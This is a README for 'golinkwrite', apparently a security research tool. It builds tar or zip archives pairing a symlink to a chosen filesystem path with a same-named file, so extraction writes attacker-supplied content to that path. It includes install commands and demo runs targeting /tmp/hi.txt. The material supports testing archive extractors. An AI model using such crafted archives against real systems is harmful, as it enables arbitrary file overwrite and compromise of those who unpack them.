# golinkwrite
Create a tar archive containing a provided file and a symlink that points to the write destination.

The blog post, which describes the background to the rool can be found here: [Link-Write Attack: A sweet combination
](https://blog.nody.cc/posts/link-write-attack/).

## Install

### Build from source

```shell
make install
```

### Fetch latest from GitHub

```shell
$ go install github.com/NodyHub/golinkwrite@latest
```



## Usage

### Help

```shell
$ golinkwrite -h
Usage: golinkwrite <input> <target> <output> [flags]

Create a tar archive containing a provided file and a symlink that points to the write destination.

Arguments:
  <input>     Input file.
  <target>    Target destination in the filesystem.
  <output>    Output file.

Flags:
  -h, --help          Show context-sensitive help.
  -t, --type="tar"    Type of the archive. (tar, zip)
  -v, --verbose       Enable verbose output.
```

### In Action

### Tar

```shell
(main[2]) ~/git/go-link-write% echo 'Hello Alice :wave:!' | tee rabbit_hole.txt
Hello Alice :wave:!

(main[2]) ~/git/go-link-write% golinkwrite -v rabbit_hole.txt /tmp/hi.txt alice.tar
time=2024-09-20T11:52:39.211+02:00 level=DEBUG msg="command line  parameters" cli="{Input:rabbit_hole.txt Target:/tmp/hi.txt Output:alice.tar Type:tar Verbose:true}"
time=2024-09-20T11:52:39.212+02:00 level=DEBUG msg="input permissions" perm=-rw-r--r--
time=2024-09-20T11:52:39.213+02:00 level=DEBUG msg="input size" size=20
time=2024-09-20T11:52:39.213+02:00 level=INFO msg="archive created" output=alice.tar

(main[2]) ~/git/go-link-write% tar ztvf alice.tar
lrw-r--r--  0 0      0           0  1 Jan  1970 rabbit_hole.txt -> /tmp/hi.txt
-rw-r--r--  0 0      0          20  1 Jan  1970 rabbit_hole.txt
```

### Zip

```shell
(main[2]) ~/git/go-link-write% echo 'Hello Alice :wave:!' | tee rabbit_hole.txt
Hello Alice :wave:!

(main[2]) ~/git/go-link-write% golinkwrite -t zip -v rabbit_hole.txt /tmp/hi.txt alice.zip
time=2024-09-20T11:54:12.300+02:00 level=DEBUG msg="command line  parameters" cli="{Input:rabbit_hole.txt Target:/tmp/hi.txt Output:alice.zip Type:zip Verbose:true}"
time=2024-09-20T11:54:12.300+02:00 level=DEBUG msg="input permissions" perm=-rw-r--r--
time=2024-09-20T11:54:12.301+02:00 level=DEBUG msg="input size" size=20
time=2024-09-20T11:54:12.301+02:00 level=INFO msg="archive created" output=alice.zip
(main[2]) ~/git/go-link-write% unzip -l alice.zip
Archive:  alice.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
       11  09-20-2024 11:54   rabbit_hole.txt
       20  08-09-2024 19:10   rabbit_hole.txt
---------                     -------
       31                     2 files
```
